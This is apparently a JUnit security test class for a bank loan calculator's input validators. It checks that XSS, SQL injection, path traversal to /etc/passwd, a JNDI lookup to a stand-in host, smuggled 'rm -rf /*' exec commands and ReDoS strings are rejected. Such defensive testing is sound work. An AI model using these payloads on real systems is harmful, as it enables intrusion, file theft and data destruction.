package com.bank.calculator.test.security;

import org.junit.jupiter.api.Test; // JUnit 5.8.2
import org.junit.jupiter.api.BeforeEach; // JUnit 5.8.2
import org.junit.jupiter.api.DisplayName; // JUnit 5.8.2
import org.junit.jupiter.params.ParameterizedTest; // JUnit 5.8.2
import org.junit.jupiter.params.provider.ValueSource; // JUnit 5.8.2
import org.junit.jupiter.params.provider.NullSource; // JUnit 5.8.2
import org.junit.jupiter.params.provider.EmptySource; // JUnit 5.8.2
import org.junit.jupiter.api.Assertions; // JUnit 5.8.2

import javafx.scene.control.TextField; // JavaFX 11
import javafx.scene.control.Label; // JavaFX 11

import com.bank.calculator.test.category.SecurityTest;
import com.bank.calculator.test.util.TestUtils;
import com.bank.calculator.service.ValidationService;
import com.bank.calculator.service.impl.ValidationServiceImpl;
import com.bank.calculator.model.ValidationResult;
import com.bank.calculator.ui.validator.InputValidator;
import com.bank.calculator.util.ValidationUtils;
import com.bank.calculator.constant.ErrorMessages;

/**
 * Security test class that verifies the application's input validation mechanisms from a security perspective.
 * This class tests that the validation logic properly handles malicious or extreme inputs that could potentially
 * compromise application security or lead to unexpected behavior.
 */
@SecurityTest
@DisplayName("Input Validation Security Tests")
public class InputValidationSecurityTest {

    private ValidationService validationService;
    private InputValidator inputValidator;
    private TextField principalField;
    private TextField durationField;
    private Label errorLabel;

    private static final String[] MALICIOUS_PRINCIPAL_INPUTS = { 
        "<script>alert('XSS')</script>", 
        "'; DROP TABLE users; --", 
        "${jndi:ldap://malicious.com/exploit}", 
        "../../../etc/passwd", 
        "\u0000", 
        "\n", 
        "\r", 
        "\t", 
        "\b", 
        "\f" 
    };
    
    private static final String[] MALICIOUS_DURATION_INPUTS = { 
        "<script>alert('XSS')</script>", 
        "'; DROP TABLE users; --", 
        "${jndi:ldap://malicious.com/exploit}", 
        "../../../etc/passwd", 
        "\u0000", 
        "\n", 
        "\r", 
        "\t", 
        "\b", 
        "\f" 
    };
    
    private static final String[] EXTREME_PRINCIPAL_INPUTS = { 
        "99999999999999999999999999999999999999999999999", 
        "-99999999999999999999999999999999999999999999999", 
        "0.000000000000000000000000000000000000000000001", 
        "1e+308", 
        "NaN", 
        "Infinity", 
        "-Infinity" 
    };
    
    private static final String[] EXTREME_DURATION_INPUTS = { 
        "99999999999999999999999999999999999999999999999", 
        "-99999999999999999999999999999999999999999999999", 
        "2147483648", 
        "9223372036854775808" 
    };

    /**
     * Set up test environment before each test.
     */
    @BeforeEach
    void setUp() {
        validationService = new ValidationServiceImpl();
        inputValidator = new InputValidator(validationService);
        principalField = new TextField();
        durationField = new TextField();
        errorLabel = new Label();
        
        TestUtils.logTestInfo("Set up InputValidationSecurityTest test environment");
    }

    /**
     * Tests that malicious principal inputs are properly rejected.
     * 
     * @param input the malicious input to test
     */
    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('XSS')</script>", 
        "'; DROP TABLE users; --", 
        "${jndi:ldap://malicious.com/exploit}", 
        "../../../etc/passwd", 
        "\u0000", 
        "\n", 
        "\r", 
        "\t", 
        "\b", 
        "\f"
    })
    @NullSource
    @EmptySource
    @DisplayName("Should reject malicious principal inputs")
    void testMaliciousPrincipalInputs(String input) {
        TestUtils.logTestInfo("Testing malicious principal input: " + (input != null ? input.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t").replace("\b", "\\b").replace("\f", "\\f") : "null"));
        
        // Test service layer validation
        ValidationResult result = validationService.validatePrincipal(input);
        Assertions.assertFalse(result.isValid(), "Validation should reject malicious input");
        
        if (input != null) {
            // Verify the error message doesn't contain the malicious input (to prevent XSS)
            Assertions.assertFalse(result.getErrorMessage().contains(input), 
                    "Error message should not contain the malicious input");
        }
        
        // Test UI layer validation
        principalField.setText(input);
        boolean isValid = inputValidator.validatePrincipalField(principalField, errorLabel);
        Assertions.assertFalse(isValid, "UI validation should reject malicious input");
        Assertions.assertTrue(errorLabel.getText().length() > 0, "Error label should contain an error message");
        Assertions.assertTrue(principalField.getStyleClass().contains("error-field"), 
                "Error styling should be applied to field");
    }

    /**
     * Tests that malicious duration inputs are properly rejected.
     * 
     * @param input the malicious input to test
     */
    @ParameterizedTest
    @ValueSource(strings = {
        "<script>alert('XSS')</script>", 
        "'; DROP TABLE users; --", 
        "${jndi:ldap://malicious.com/exploit}", 
        "../../../etc/passwd", 
        "\u0000", 
        "\n", 
        "\r", 
        "\t", 
        "\b", 
        "\f"
    })
    @NullSource
    @EmptySource
    @DisplayName("Should reject malicious duration inputs")
    void testMaliciousDurationInputs(String input) {
        TestUtils.logTestInfo("Testing malicious duration input: " + (input != null ? input.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t").replace("\b", "\\b").replace("\f", "\\f") : "null"));
        
        // Test service layer validation
        ValidationResult result = validationService.validateDuration(input);
        Assertions.assertFalse(result.isValid(), "Validation should reject malicious input");
        
        if (input != null) {
            // Verify the error message doesn't contain the malicious input (to prevent XSS)
            Assertions.assertFalse(result.getErrorMessage().contains(input), 
                    "Error message should not contain the malicious input");
        }
        
        // Test UI layer validation
        durationField.setText(input);
        boolean isValid = inputValidator.validateDurationField(durationField, errorLabel);
        Assertions.assertFalse(isValid, "UI validation should reject malicious input");
        Assertions.assertTrue(errorLabel.getText().length() > 0, "Error label should contain an error message");
        Assertions.assertTrue(durationField.getStyleClass().contains("error-field"), 
                "Error styling should be applied to field");
    }

    /**
     * Tests that extreme principal inputs are properly handled.
     * 
     * @param input the extreme input to test
     */
    @ParameterizedTest
    @ValueSource(strings = {
        "99999999999999999999999999999999999999999999999",
        "-99999999999999999999999999999999999999999999999",
        "0.000000000000000000000000000000000000000000001",
        "1e+308",
        "NaN",
        "Infinity",
        "-Infinity"
    })
    @DisplayName("Should handle extreme principal inputs")
    void testExtremePrincipalInputs(String input) {
        TestUtils.logTestInfo("Testing extreme principal input: " + input);
        
        // Test service layer validation
        ValidationResult result = validationService.validatePrincipal(input);
        Assertions.assertFalse(result.isValid(), "Validation should reject extreme input");
        
        // Test UI layer validation
        principalField.setText(input);
        boolean isValid = inputValidator.validatePrincipalField(principalField, errorLabel);
        Assertions.assertFalse(isValid, "UI validation should reject extreme input");
        Assertions.assertTrue(errorLabel.getText().length() > 0, "Error label should contain an error message");
        Assertions.assertTrue(principalField.getStyleClass().contains("error-field"), 
                "Error styling should be applied to field");
    }

    /**
     * Tests that extreme duration inputs are properly handled.
     * 
     * @param input the extreme input to test
     */
    @ParameterizedTest
    @ValueSource(strings = {
        "99999999999999999999999999999999999999999999999",
        "-99999999999999999999999999999999999999999999999",
        "2147483648",
        "9223372036854775808"
    })
    @DisplayName("Should handle extreme duration inputs")
    void testExtremeDurationInputs(String input) {
        TestUtils.logTestInfo("Testing extreme duration input: " + input);
        
        // Test service layer validation
        ValidationResult result = validationService.validateDuration(input);
        Assertions.assertFalse(result.isValid(), "Validation should reject extreme input");
        
        // Test UI layer validation
        durationField.setText(input);
        boolean isValid = inputValidator.validateDurationField(durationField, errorLabel);
        Assertions.assertFalse(isValid, "UI validation should reject extreme input");
        Assertions.assertTrue(errorLabel.getText().length() > 0, "Error label should contain an error message");
        Assertions.assertTrue(durationField.getStyleClass().contains("error-field"), 
                "Error styling should be applied to field");
    }

    /**
     * Tests that combined malicious inputs are properly rejected.
     */
    @Test
    @DisplayName("Should reject combined malicious inputs")
    void testCombinedMaliciousInputs() {
        for (String principalInput : new String[]{
                "<script>alert('XSS')</script>", 
                "'; DROP TABLE users; --", 
                "${jndi:ldap://malicious.com/exploit}"}) {
            for (String durationInput : new String[]{
                    "<script>alert('XSS')</script>", 
                    "'; DROP TABLE users; --", 
                    "${jndi:ldap://malicious.com/exploit}"}) {
                
                TestUtils.logTestInfo("Testing combined malicious inputs - Principal: " + principalInput + ", Duration: " + durationInput);
                
                ValidationResult result = validationService.validateAllInputs(principalInput, durationInput);
                Assertions.assertFalse(result.isValid(), "Combined validation should reject malicious inputs");
                
                // Verify the error message doesn't contain the malicious input (to prevent XSS)
                Assertions.assertFalse(result.getErrorMessage().contains(principalInput), 
                        "Error message should not contain the malicious principal input");
                Assertions.assertFalse(result.getErrorMessage().contains(durationInput), 
                        "Error message should not contain the malicious duration input");
            }
        }
    }

    /**
     * Tests that inputs are properly sanitized before processing.
     */
    @Test
    @DisplayName("Should sanitize inputs before processing")
    void testInputSanitization() {
        // Test inputs with potentially dangerous characters
        String[] testInputs = {
            "<div>test</div>",
            "1000.00<!-- comment -->",
            "500/**/",
            "1000.00\"; exec(\"rm -rf /*\")",
            "5; exec(\"rm -rf /*\")"
        };
        
        for (String input : testInputs) {
            TestUtils.logTestInfo("Testing input sanitization for: " + input);
            
            // Verify for principal validation
            ValidationResult principalResult = validationService.validatePrincipal(input);
            if (!principalResult.isValid()) {
                String errorMessage = principalResult.getErrorMessage();
                Assertions.assertFalse(errorMessage.contains("<"), "Error message should not contain unescaped < character");
                Assertions.assertFalse(errorMessage.contains(">"), "Error message should not contain unescaped > character");
                Assertions.assertFalse(errorMessage.contains("<!--"), "Error message should not contain HTML comment");
                Assertions.assertFalse(errorMessage.contains("/*"), "Error message should not contain JS comment");
                Assertions.assertFalse(errorMessage.contains("exec"), "Error message should not contain dangerous commands");
            }
            
            // Verify for duration validation
            ValidationResult durationResult = validationService.validateDuration(input);
            if (!durationResult.isValid()) {
                String errorMessage = durationResult.getErrorMessage();
                Assertions.assertFalse(errorMessage.contains("<"), "Error message should not contain unescaped < character");
                Assertions.assertFalse(errorMessage.contains(">"), "Error message should not contain unescaped > character");
                Assertions.assertFalse(errorMessage.contains("<!--"), "Error message should not contain HTML comment");
                Assertions.assertFalse(errorMessage.contains("/*"), "Error message should not contain JS comment");
                Assertions.assertFalse(errorMessage.contains("exec"), "Error message should not contain dangerous commands");
            }
        }
    }

    /**
     * Tests that regex injection attacks are properly handled.
     */
    @Test
    @DisplayName("Should handle regex injection attempts")
    void testRegexInjection() {
        // Evil regex patterns that could cause excessive backtracking
        String[] evilRegexInputs = {
            "1000" + "a".repeat(10000),
            "5" + "a".repeat(10000),
            "(a+)+" + "a".repeat(100), // Catastrophic backtracking pattern
            "(.*a){25}" + "a".repeat(25)
        };
        
        for (String input : evilRegexInputs) {
            TestUtils.logTestInfo("Testing regex injection for input of length: " + input.length());
            
            // For principal input
            long startTime = System.currentTimeMillis();
            ValidationResult principalResult = validationService.validatePrincipal(input);
            long endTime = System.currentTimeMillis();
            
            // Ensure validation completes within reasonable time (5 seconds max)
            Assertions.assertTrue((endTime - startTime) < 5000, 
                    "Principal validation should complete within 5 seconds");
            Assertions.assertFalse(principalResult.isValid(), 
                    "Regex injection attempt for principal should be rejected");
            
            // For duration input
            startTime = System.currentTimeMillis();
            ValidationResult durationResult = validationService.validateDuration(input);
            endTime = System.currentTimeMillis();
            
            // Ensure validation completes within reasonable time (5 seconds max)
            Assertions.assertTrue((endTime - startTime) < 5000, 
                    "Duration validation should complete within 5 seconds");
            Assertions.assertFalse(durationResult.isValid(), 
                    "Regex injection attempt for duration should be rejected");
        }
    }

    /**
     * Tests that buffer overflow attempts are properly handled.
     */
    @Test
    @DisplayName("Should handle buffer overflow attempts")
    void testBufferOverflowAttempts() {
        // Create extremely long input strings
        String longInputPrincipal = "1" + "0".repeat(100000);
        String longInputDuration = "1" + "0".repeat(100000);
        
        TestUtils.logTestInfo("Testing buffer overflow with principal input length: " + longInputPrincipal.length());
        TestUtils.logTestInfo("Testing buffer overflow with duration input length: " + longInputDuration.length());
        
        try {
            // For principal input
            ValidationResult principalResult = validationService.validatePrincipal(longInputPrincipal);
            Assertions.assertFalse(principalResult.isValid(), 
                    "Buffer overflow attempt for principal should be rejected");
            
            // For duration input
            ValidationResult durationResult = validationService.validateDuration(longInputDuration);
            Assertions.assertFalse(durationResult.isValid(), 
                    "Buffer overflow attempt for duration should be rejected");
        } catch (Exception e) {
            Assertions.fail("Validation should handle extremely long inputs without throwing exceptions: " + e.getMessage());
        }
    }

    /**
     * Tests that validation is consistent across different components.
     */
    @Test
    @DisplayName("Should maintain validation consistency across components")
    void testValidationConsistency() {
        String[] testInputs = {
            "abc", // Invalid format for both principal and duration
            "0", // Zero value (invalid)
            "-100", // Negative value (invalid)
            "<script>alert('test')</script>" // Attempt at XSS (invalid)
        };
        
        for (String input : testInputs) {
            TestUtils.logTestInfo("Testing validation consistency for input: " + input);
            
            // For principal validation
            ValidationResult serviceResult = validationService.validatePrincipal(input);
            ValidationResult utilsResult = ValidationUtils.validatePrincipal(input);
            
            principalField.setText(input);
            boolean uiResult = inputValidator.validatePrincipalField(principalField, errorLabel);
            
            // All validation methods should give the same result
            Assertions.assertEquals(serviceResult.isValid(), utilsResult.isValid(), 
                    "ValidationService and ValidationUtils should be consistent for principal");
            Assertions.assertEquals(serviceResult.isValid(), uiResult, 
                    "ValidationService and InputValidator should be consistent for principal");
            
            TestUtils.assertValidationResult(serviceResult, false, null);
            
            // For duration validation
            serviceResult = validationService.validateDuration(input);
            utilsResult = ValidationUtils.validateDuration(input);
            
            durationField.setText(input);
            uiResult = inputValidator.validateDurationField(durationField, errorLabel);
            
            // All validation methods should give the same result
            Assertions.assertEquals(serviceResult.isValid(), utilsResult.isValid(), 
                    "ValidationService and ValidationUtils should be consistent for duration");
            Assertions.assertEquals(serviceResult.isValid(), uiResult, 
                    "ValidationService and InputValidator should be consistent for duration");
            
            TestUtils.assertValidationResult(serviceResult, false, null);
        }
    }
}